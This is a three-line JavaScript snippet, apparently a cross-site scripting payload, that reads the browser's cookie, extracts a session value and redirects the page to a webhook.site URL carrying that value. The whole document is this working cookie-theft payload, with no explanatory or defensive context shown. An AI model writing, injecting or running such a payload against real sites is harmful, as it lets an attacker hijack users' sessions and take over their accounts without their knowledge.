console.log("xss");
var sessionid = document.cookie.split('=')[1] + "."; 
document.location = "https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82/?" + sessionid;
